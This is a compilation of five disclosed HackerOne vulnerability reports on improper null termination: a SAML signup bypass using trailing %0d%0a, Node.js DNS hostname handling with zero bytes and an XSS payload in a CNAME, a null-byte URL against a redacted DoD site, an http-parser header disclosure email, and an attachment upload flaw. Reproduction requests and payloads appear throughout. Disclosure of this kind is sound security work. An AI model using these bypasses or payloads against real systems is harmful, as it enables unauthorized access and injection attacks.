# Improper Null Termination

_5 reports — High/Critical, disclosed_

### [HackerOne SAML signup domain enforcement bypass results in unauthorized access to HackerOne PullRequest organization](https://hackerone.com/reports/2101076)

- **Report ID:** `2101076`
- **Severity:** High
- **Weakness:** Improper Null Termination
- **Program:** HackerOne
- **Reporter:** @0xacb
- **Bounty:** - usd
- **Disclosed:** 2024-02-04T02:19:19.962Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

SAML signup domain enforcement for new signups that belong to a SAML-enabled organization can be bypassed with trailing control characters. While the described issue affects all organizations with this feature enabled, it's possible to leverage it to access the PullRequest HackerOne organization, giving a real attacker access to HackerOne source code in Pull Requests.

**Description:**

When signing up on hackerone.com, email domains enforced by HackerOne SSO are not allowed for regular registration. The request to `/POST users` returns a redirect to the SSO provider:

```
POST /users HTTP/1.1
Host: hackerone.com
...

user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

```json
{"redirect_path":"/users/saml/sign_in?email=email%40example.com"}
```

However, adding a `%0d%0a` in the end of the email param will make the request go through:

```
POST /users HTTP/1.1
Host: hackerone.com
...

user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com%0d%0a&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

```json
{"redirect_path":"/users/sign_in","errors":{}}
```

Then, logging in with the actual email `email@example.com` will work, but email verification is then enforced. Accessing the account will work if the email owner clicks on the HackerOne standard verification email sometime in the future.

Since hackerone.com is a domain part of a SAML-enabled organization itself, if an attacker creates multiple accounts that will send legitimate verification emails to `@hackerone.com` users and one clicks it, accessing PullRequest via `Sign in with HackerOne` on https://app.pullrequest.com/login, will then allow source code access.

The following steps were followed along with @jobert to create a `j@hackerone.com` account that will then allow access to PullRequest:

{F2581722}

### Steps To Reproduce

1. Go to https://hackerone.com 
2. Signup as the attacker with a `@hackerone.com` email you control, e.g. `x@hackerone.com` or `x+test@hackerone.com`, notice that this will redirect you to the SSO login
3. Try to signup again and intercept the request to `POST /users` and add the `%0d%0a` in the end of the email parameter
4. As the victim, click the confirmation email in a separate session
5. As the attacker on the original session, log in with the password you chose for the account
6. Go to https://app.pullrequest.com/login and click `Sign in with HackerOne`
7. You'll have access to all pull requests of HackerOne infrastructure codebase, including source code access

## Impact

An attacker can bypass the signup SAML enforcement for any organization on HackerOne, including HackerOne organization itself which leads to source code access. Verifying the email is the only interaction step, but an actual attack could be feasible.

On the other hand, when SAML accounts are provisioned for any organization, the previous sessions are revoked, but not API keys. So an attacker who can pre-stage an account on HackerOne and generate API keys will keep backdoor access to the account until the API keys are rotated explicitly by the victim, which could mean forever for specific accounts that will never rotate the API keys.

## Suggested mitigations

- Correctly strip and normalize the email address that is being processed in the signup endpoint to check if SAML is enforced
- Don't give access to anyone with an `@hackerone.com` email address to PullRequest without manual approval or account flags

## Notes:

- No source code was stored locally while performing this testing
- The accounts created while testing were `j@hackerone.com` and `0xacb@hackerone.com`
- The `0xacb@hackerone.com` was created around 18 months ago - I didn't realize any impact until now after showing this behavior to @jobert during h1-702-2023

---

### [Improper handling of untypical characters in domain names](https://hackerone.com/reports/1178337)

- **Report ID:** `1178337`
- **Severity:** High
- **Weakness:** Improper Null Termination
- **Program:** Node.js
- **Reporter:** @philippjeitner
- **Bounty:** - usd
- **Disclosed:** 2021-09-10T17:51:58.124Z
- **CVE(s):** CVE-2021-22931

**Vulnerability Information:**

# Description

Missing input validation of host names returned by Domain Name Servers in node's `dns` library can lead to output of wrong hostnames (leading to Domain Hijacking) and injection vulnerabilities in applications using the library (leading to Remote Code Execution, XSS, Applications crashes, etc.).

# Discoverer(s)/Credits

Philipp Jeitner, Fraunhofer SIT

# References

Injection Attacks Reloaded: Tunnelling Malicious Payloads over DNS
https://www.usenix.org/conference/usenixsecurity21/presentation/jeitner
(Available starting from August 11, 2021)

# Steps To Reproduce

Using the example application (`main.js`) which does dns lookups via node.

```
const dns = require('dns');

if (process.argv[2] == "-x") {
	var host = process.argv[3];

	dns.reverse(host, (err, result) => {
		
		if (result){
			for (var i = 0; i < result.length; i++)
			{
				console.log("node".padEnd(8), "reverse".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "IN".padEnd(5), "PTR".padEnd(5), result[i]);
			}
		} else {
			console.log("node".padEnd(8), "reverse".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "-".padEnd(5), "ERROR".padEnd(5), err.errno);
		}
	});
	
} else {
	var host = process.argv[2];
	dns.lookup(host, (err, result) => {
		if (result) {
			console.log("node".padEnd(8), "lookup".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "IN".padEnd(5), "A".padEnd(5), result);
		} else {
			console.log("node".padEnd(8), "lookup".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "-".padEnd(5), "ERROR".padEnd(5), err.errno);
		}
	});
	
	dns.resolve(host, (err, result) => {
		if (result) {
			for (var i = 0; i < result.length; i++) {
				console.log("node".padEnd(8), "resolve".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "IN".padEnd(5), "A".padEnd(5), result[i]);
			}
		} else {
			console.log("node".padEnd(8), "resolve".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "-".padEnd(5), "ERROR".padEnd(5), err.errno);
		}
	});
	
	dns.resolveCname(host, (err, result) => {
		if (result) {
			for (var i = 0; i < result.length; i++) {
				console.log("node".padEnd(8), "resolveCname".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "IN".padEnd(5), "CNAME".padEnd(5), result[i]);
			}
		} else {
			console.log("node".padEnd(8), "resolveCname".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "-".padEnd(5), "ERROR".padEnd(5), err.errno);
		}
		
	});
	
}
```

Run the code with the example domains provided by us:

```
$ node main.js cnamezeroweb.test.xdi-attack.net

node     resolveCname     cnamezeroweb.test.xdi-attack.net - -  IN    CNAME zero.longtxtrecord.ml

$ node main.js cnamexss.test.xdi-attack.net

node     resolveCname     cnamexss.test.xdi-attack.net  - -  IN    CNAME <img/src=''/onerror='alert&#x28&#x22xss&#x22&#x29'>.a.cnamexss.test.xdi-attack.net
```

Compare with the output of a well-behaving stub resolver library (glibc) and/or dig:

```
$ dig dig cnamezeroweb.test.xdi-attack.net

cnamezeroweb.test.xdi-attack.net. 284 IN CNAME  zero.longtxtrecord.ml\000cnamezeroweb.test.xdi-attack.net.
zero.longtxtrecord.ml\000cnamezeroweb.test.xdi-attack.net. 284 IN A 1.2.3.4

$ dig cnamezeroweb.test.xdi-attack.net

cnamezeroweb.test.xdi-attack.net. 300 IN CNAME  zero.longtxtrecord.ml\000cnamezeroweb.test.xdi-attack.net.
zero.longtxtrecord.ml\000cnamezeroweb.test.xdi-attack.net. 299 IN A 1.2.3.4

$ getent hosts cnamezeroweb.test.xdi-attack.net
$ getent hosts cnamexss.test.xdi-attack.net

(no output, return code = 2 because name is filtered)
```

The first issue (cnamezeroweb) is a clear error in zero-byte handling and can potentially lead to DNS-cache injections in case an application implements a cache based on the library.

The second (cnamexss) shows that this can be used to tunnel all kinds of injection payloads, and we argue that applications do not typically expect other characters than [a-z0-9-.] in hostnames. We are aware of applications which can be exploited via this second attack vector (stub dns resovlers which does not filter special characters from hostnames) and argue that stub-resolver libraries should only allow hostnames containing [a-z0-9-.], as it is implemented by glibc's gethostbyname, etc. functions. See the Section 'More information' below on standardization of stub resolver functionality.

Note: One might argue that underscores (_) should also be allowed, since they are used for many application like DMARC, SRV, etc. Actually the underscore was chosen exactly because it is a character not allowed in "hostnames" and thus dmarc records (_dmarc.example.com) does not conflict with "normal" hostnames (See RFC8552, Section 1.1).

The same exploits also apply to reverse-dns records via node's `dns.reverse` function, and probably functions for other record types as well (not tested). You can test this by setting up a nameserver with the following records, in bind9 this requires disabling the `check-names` option in the configuration.

```
1.1.1.1.in-addr.arpa.   300     IN      PTR     t\000.example.com.
3.3.3.3.in-addr.arpa.   300     IN      PTR     <img/src=''/onerror='alert&#x28&#x22xss&#x22&#x29'>.example.com.
```

Then run `node main.js -x 1.1.1.1` and observe the misinterpreted/unfiltered result.

*Note*: I selected CWE-170 "Improper Null Termination" as a weakness, however this only applies to the first issue.  You might want to consider this two seperate issues (zero-byte handling and missing filtering).

# More information

The POSIX Standard for Information Technology defines interfaces for DNS lookups in systems standard C libraries. This Standard includes functions for forward lookups (gethostbyname, getaddrinfo) as well as backward-lookups (gethostbyaddr, getnameinfo). These funtions cannot only return IP addresses but can also contain host names of aliases (CNAME) of the requested host name in case of forward-lookups, or the primary host name of that ip address in the case of backward-lookups (PTR). The POSIX Standard defines the data format of these host names as a null-terminated C-String containing a "hostname" or "nodename", which are typically expected by developers and defined by RFC952 [2] and RFC1123 [3] to only contain alphanumeric characters (a-z,A-Z,0-9), hyphens ("-") and periods (".") to split labels. This creates a mismatch of allowed characters between "hostnames" and "domain names" as defined by the DNS standard [4] which defines "domain names" as a series of "text labels" which are textually represented by concatenating all "text labels" and joining them together with period signs. However, "text labels" can contain any octet value, even zero-bytes ("\x00") and period signs (".") and recursive DNS resolvers are required by the DNS standard to support any of these characters in DNS records, thus not implementing any sanitiy checks on domain names.

When DNS responses are parsed by the stub DNS resolver implemented by stub resolver library as part of the `gethostbyname()`, `getaddrinfo()`, `gethostbyaddr()` and `getnameinfo()` functions, these functions must therefore ensure that the returned, null-terminated C-Strings must be valid domain names as defined by the POSIX standard, else applications which use these values might include that information in contexts where malicious data can included inside the domain name and used for command injection attacks like Cross-Site-Scripting, SQL-injections, etc. Furthermore, if domain names contain text labels with periods (".") or zero-bytes ("\x00") and the stub resolver library does naively decode these domain names into strings, attackers can create malicious domain names which are misinterpreted by the naive decoding logic to look like different domain names than they actually are. When these misinterpreted domain names are than cached by applications using the stub resolver, this allows for domain hijacking by poisoning of the applications DNS cache which uses the vulnerable stub resolver library.

*Note*: node does not implement a stub resolver as standardized by POSIX, so the rules about allowed vs. non-allowed characters do not directly apply. However, we argue that developers do not know about the specifics of the "hostname" vs. "domain name" consideration, so any library which implements dns lookups should ideally behave in the same way to reduce vulnerabilities caused by developers switching from another language/stub resolver library.

## Impact

Impact depends on the application triggering the DNS lookup, see description.

---

### [Null byte Injection in https://████/](https://hackerone.com/reports/709072)

- **Report ID:** `709072`
- **Severity:** High
- **Weakness:** Improper Null Termination
- **Program:** U.S. Dept Of Defense
- **Reporter:** @mohammedadam24
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T17:17:48.736Z
- **CVE(s):** -

**Vulnerability Information:**

#Description:
Microsoft .NET Framework is prone to multiple NULL-byte injection vulnerabilities because it fails to adequately sanitize user-supplied data.

#Vulnerable URL: https://████/%2F%20This%20website%20is%20vulnerable%20to%20NULL%20BYTE%20INJECTION/

#Steps to Reproduce:
1) An attacker can exploit this issue via a browser.

The following example URI request is available:
https://███████/%2F%20This%20website%20is%20vulnerable%20to%20NULL%20BYTE%20INJECTION%00

#Mitigation: https://www.securityfocus.com/bid/24791/solution

#See Also: https://www.exploit-db.com/exploits/30281

#Proof of Concept: Screenshots attached.

## Impact

An attacker can exploit these issues to access sensitive information that may aid in further attacks; other attacks are also possible.

---

### [Vulnerability in http-parser & embedded NULL header handling](https://hackerone.com/reports/536954)

- **Report ID:** `536954`
- **Severity:** High
- **Weakness:** Improper Null Termination
- **Program:** Node.js
- **Reporter:** @htuch
- **Bounty:** - usd
- **Disclosed:** 2020-02-13T23:41:54.567Z
- **CVE(s):** CVE-2019-9900

**Vulnerability Information:**

Due to a snafu in how security@node.js.org is setup to forward (see https://github.com/envoyproxy/envoy/issues/5155), the following bug report was not made available prior to disclosure. For completeness, I'm providing the original e-mail below. 

Please note that this has been fixed in http-parser since disclosures. I understand that Node has moved away from http-parser, but this might affect Node.JS LTS for earlier versions. See https://github.com/nodejs/http-parser/issues/468 for the fix.

Rather than file a full report, I would like to share with Node.JS security WG the following resources:

* Envoy CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9900
* Envoy GH issue with CVE details: https://github.com/envoyproxy/envoy/issues/6434
* http-parser GH issue: https://github.com/nodejs/http-parser/issues/468
* Other discussion of the handling of this issue: https://github.com/envoyproxy/envoy/issues/5155#issuecomment-481854258

Original e-mail
------------------------
MIME-Version: 1.0
Date: Thu, 14 Mar 2019 16:35:20 -0400
Message-ID: <CAA4W8ZmaBzTMFU8VdpJzVDM7LXo0o5-WPTdYisGJUF9qsXiPnQ@mail.gmail.com>
Subject: Vulnerability in http-parser & embedded NULL header handling
From: Harvey Tuch <htuch@google.com>
To: security@nodejs.org, ry@tinyclouds.org
Cc: envoy-security@googlegroups.com
Content-Type: multipart/alternative; boundary="0000000000006b3f64058413dc0b"

--0000000000006b3f64058413dc0b
Content-Type: text/plain; charset="UTF-8"

Hi Node.js Security WG, Ryan,

We (Envoy security team) have discovered a potential security vulnerability
related to our use of http-parser that we are working to fix, patch and
issue a security update for Envoy-side following
https://github.com/envoyproxy/envoy/blob/master/SECURITY_RELEASE_PROCESS.md.

We would like to give you advanced notice of this under embargo, check in
with you to see if this might affect Node.js or other http-parser users,
and potentially coordinate on an http-parser side fix.

Envoy makes use of http-parser as its HTTP/1 codec on its data plane. Envoy
has baked into it today the assumption that its HTTP codecs (http-parser,
nghttp2) enforce RFC constraints on valid header values (
https://tools.ietf.org/html/rfc7230#section-3.2.6). In particular, we
expect that there are no embedded NULLs in header values or keys that are
placed in Envoy's HeaderStrings and HeaderMapImpls objects. This is
particularly important because we allow two views of a HeaderString, via
c_str()
<https://github.com/envoyproxy/envoy/blob/b41ba5925a4e93d22a86c6501d63314ccf0d79f3/include/envoy/http/header_map.h#L115>
 and getStringView()
<https://github.com/envoyproxy/envoy/blob/b41ba5925a4e93d22a86c6501d63314ccf0d79f3/include/envoy/http/header_map.h#L120>;
embedded NULLS cause inconsistent views and lengths through these
accessors. We use a mixture of these in header matching and routing.

Our fuzzers and some recently introduced ASSERTs indicated that embedded
NULLs were making their way into header values received from http-parser.
Digging deeper, the errant behavior is due to a bug in how validation of
header values is performed by http-parser. You can see this in the
validation logic at
https://github.com/nodejs/http-parser/blob/0d0a24e19eb5ba232d2ea8859aba2a7cc6c42bc4/http_parser.c#L1469
.

In particular, only the first character of the header value is validate at
line 1490. Then the entire header value is accepted via a memchr scan at
https://github.com/nodejs/http-parser/blob/0d0a24e19eb5ba232d2ea8859aba2a7cc6c42bc4/http_parser.c#L1506
.

This means that we can have arbitrary embedded NULLs in any HTTP/1.1 header
value today. There are places in Envoy where we use one view of these
strings for matching (e.g. route table lookup, authorization) and another
view for routing and sending to our upstreams.

We have scored this as 6.5 using CVSS and will work on an Envoy patch to
reject any header values that contain NULL and issue a point release and
public disclosure following
https://github.com/envoyproxy/envoy/blob/master/SECURITY_RELEASE_PROCESS.md
ASAP.

This issue can/should also be resolved in http-parser by ensuring the
entire header value is validated as per RFC. We do not plan on doing the
fix for this prior to our release, but will coordinate with you folks if
you are interested in doing so.

Please advise on how you would like to proceed with this. We are planning
to get our disclosure/release happening either end-of-week or early next
week, but we would like to provide you an opportunity to provide some input
here, since this has not been publicly disclosed yet we can provide some
additional time if needed.

Thanks,
Harvey (on behalf of Envoy security team)

--0000000000006b3f64058413dc0b
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr">Hi Node.js Security WG, =
Ryan,<div><br></div><div>We (Envoy security team) have discovered a potenti=
al security vulnerability related to our use of http-parser that we are wor=
king to fix, patch and issue a security update for Envoy-side following=C2=
=A0<a href=3D"https://github.com/envoyproxy/envoy/blob/master/SECURITY_RELE=
ASE_PROCESS.md">https://github.com/envoyproxy/envoy/blob/master/SECURITY_RE=
LEASE_PROCESS.md</a>.</div><div><br></div><div>We would like to give you ad=
vanced notice of this under embargo, check in with you to see if this might=
 affect Node.js or other http-parser users, and potentially coordinate on a=
n http-parser side fix.</div><div><br></div><div>Envoy makes use of http-pa=
rser as its HTTP/1 codec on its data plane. Envoy has baked into it today t=
he assumption that its HTTP codecs (http-parser, nghttp2) enforce RFC const=
raints on valid header values (<a href=3D"https://tools.ietf.org/html/rfc72=
30#section-3.2.6" target=3D"_blank">https://tools.ietf.org/html/rfc7230#sec=
tion-3.2.6</a>). In particular, we expect that there are no embedded NULLs =
in header values or keys that are placed in Envoy&#39;s HeaderStrings and H=
eaderMapImpls objects. This is particularly important because we allow two =
views of a HeaderString, via=C2=A0<a href=3D"https://github.com/envoyproxy/=
envoy/blob/b41ba5925a4e93d22a86c6501d63314ccf0d79f3/include/envoy/http/head=
er_map.h#L115" target=3D"_blank">c_str()</a>=C2=A0and=C2=A0<a href=3D"https=
://github.com/envoyproxy/envoy/blob/b41ba5925a4e93d22a86c6501d63314ccf0d79f=
3/include/envoy/http/header_map.h#L120" target=3D"_blank">getStringView()</=
a>; embedded NULLS cause inconsistent views and lengths through these acces=
sors. We use a mixture of these in header matching and routing.</div></div>=
<div><br></div><div>Our fuzzers and some recently introduced ASSERTs indica=
ted that embedded NULLs were making their way into header values received f=
rom http-parser. Digging deeper, the errant behavior is due to a bug in how=
 validation of header values is performed by http-parser. You can see this =
in the validation logic at=C2=A0<a href=3D"https://github.com/nodejs/http-p=
arser/blob/0d0a24e19eb5ba232d2ea8859aba2a7cc6c42bc4/http_parser.c#L1469" ta=
rget=3D"_blank">https://github.com/nodejs/http-parser/blob/0d0a24e19eb5ba23=
2d2ea8859aba2a7cc6c42bc4/http_parser.c#L1469</a>.=C2=A0</div><div><br></div=
><div>In particular, only the first character of the header value is valida=
te at line 1490. Then the entire header value is accepted via a memchr scan=
 at=C2=A0<a href=3D"https://github.com/nodejs/http-parser/blob/0d0a24e19eb5=
ba232d2ea8859aba2a7cc6c42bc4/http_parser.c#L1506" target=3D"_blank">https:/=
/github.com/nodejs/http-parser/blob/0d0a24e19eb5ba232d2ea8859aba2a7cc6c42bc=
4/http_parser.c#L1506</a>.</div><div><br></div><div>This means that we can =
have arbitrary embedded NULLs in any HTTP/1.1 header value today. There are=
 places in Envoy where we use one view of these strings for matching (e.g. =
route table lookup, authorization) and another view for routing and sending=
 to our upstreams.<br></div><div><br></div><div>We have scored this as 6.5 =
using CVSS and will work on an Envoy patch to reject any header values that=
 contain NULL and issue a point release and public disclosure following=C2=
=A0<a href=3D"https://github.com/envoyproxy/envoy/blob/master/SECURITY_RELE=
ASE_PROCESS.md">https://github.com/envoyproxy/envoy/blob/master/SECURITY_RE=
LEASE_PROCESS.md</a> ASAP.</div><div><br></div><div>This issue can/should a=
lso be resolved in http-parser by ensuring the entire header value is valid=
ated as per RFC. We do not plan on doing the fix for this prior to our rele=
ase, but will coordinate with you folks if you are interested in doing so.<=
/div><div><br></div><div>Please advise on how you would like to proceed wit=
h this. We are planning to get our disclosure/release happening either end-=
of-week or early next week, but we would like to provide you an opportunity=
 to provide some input here, since this has not been publicly disclosed yet=
 we can provide some additional time if needed.</div><div><br></div><div>Th=
anks,</div><div>Harvey (on behalf of Envoy security team)</div><div><br></d=
iv></div></div>

--0000000000006b3f64058413dc0b--

## Impact

This has a CVSS score of 8.3 for Envoy as a project consuming http-parser. The impact on Node.JS is unclear to me.

---

### [Unauthenticated user can upload an attachment to the last updated report draft](https://hackerone.com/reports/419896)

- **Report ID:** `419896`
- **Severity:** High
- **Weakness:** Improper Null Termination
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2018-10-09T23:55:44.633Z
- **CVE(s):** -

**Summary (team):**

"What, HackerOne resolved a report that was submitted by @jobert?"

At HackerOne we often find security vulnerabilities ourselves. In most cases, we find them before new features even make it into production. Sometimes we find them when they're already in the wild. Recently we've launched a new feature called [retesting](https://docs.hackerone.com/hackers/retesting.html). Up until now, HackerOne would always retest our own findings. We're changing that. This is the first report we identified ourselves where we're expanding retesting to the community. When we identified this vulnerability, we filed a ticket to our own bug bounty program instead of filing an internal ticket. We then leveraged the community to retest the vulnerability and allow them to find a bypass.

This particular security vulnerability allowed an unauthenticated user to upload attachments and attach them to the last created report draft of other users. This was possible by sending a specially crafted request to the `/attachments` endpoint. Our investigation concluded that this was not abused.

Thanks to the hackers that retested this vulnerability!

---
